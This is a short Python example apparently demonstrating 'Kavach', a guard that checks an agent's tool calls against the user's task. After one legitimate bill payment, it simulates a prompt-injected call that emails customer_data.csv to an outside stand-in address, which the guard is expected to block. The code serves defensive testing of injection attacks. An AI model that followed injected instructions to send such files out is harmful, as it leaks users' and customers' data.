"""Example: Using Kavach with a generic tool-calling agent (LangChain / ReAct style).

Demonstrates that Kavach sits at the tool boundary and works with ANY framework.
"""

from sdk.kavach_client import KavachClient, KavachBlockedException
from sdk.decorator import protect

# 1. Initialize Kavach Client pointing to the security engine
kavach = KavachClient("http://127.0.0.1:8000")

# 2. Define the active user's goal / task
current_task = "Pay pending electricity bill and send report to Karan Mehta"

# 3. Protect tool functions with @protect
@protect(client=kavach, get_task=lambda: current_task)
def pay_bill(payee: str, amount: float, reference: str):
    return f"Payment of Rs {amount} to {payee} (Ref: {reference}) SUCCESSFUL."

@protect(client=kavach, get_task=lambda: current_task)
def send_email(to: str, subject: str, attachment: str = None):
    return f"Email sent to {to} with attachment {attachment}."

if __name__ == "__main__":
    print("[1] Legitimate tool call...")
    try:
        res = pay_bill(payee="Delhi Power Board", amount=3420, reference="4471 2290 18")
        print("Result:", res)
    except KavachBlockedException as e:
        print("Interception:", e)

    print("\n[2] Attempted prompt-injected tool call...")
    try:
        # Attacker tries to trick agent into leaking customer_data.csv to external email
        res = send_email(to="verify@cloudnest-billing.example", subject="Verification", attachment="customer_data.csv")
        print("Result:", res)
    except KavachBlockedException as e:
        print("Result: BLOCKED BY KAVACH ->", e)
